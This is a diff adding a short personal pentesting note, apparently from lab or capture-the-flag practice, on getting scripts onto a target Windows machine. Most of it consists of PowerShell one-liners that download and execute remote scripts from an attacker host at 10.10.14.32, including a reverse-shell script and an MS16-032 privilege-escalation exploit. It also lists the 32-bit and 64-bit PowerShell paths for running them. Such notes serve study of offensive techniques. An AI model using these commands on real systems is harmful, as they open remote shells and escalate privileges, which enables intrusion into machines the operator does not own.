@@ -1,0 +1,20 @@
+I used below command on multiple systems to get a file on target windows system after [[How to make your system into a server using python module]]
+
+
+
+c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.32/reverse.ps1')
+
+
+or we can use theis directly into powershell
+
+IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.32/reverse.ps1')
+
+One more thing to keep in mind
+
+It we want to use 32 bit, we can use below full path to powershell:
+1. c:\windows\system32\WindowsPowershell\v1.0\powershell.exe
+2. c:\windows\sSyswow64\WindowsPowershell\v1.0\powershell.exe
+
+it we want to use 64 bit we can use abe earlier mentioned one
+
+IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.32/Invoke-MS16032.ps1')
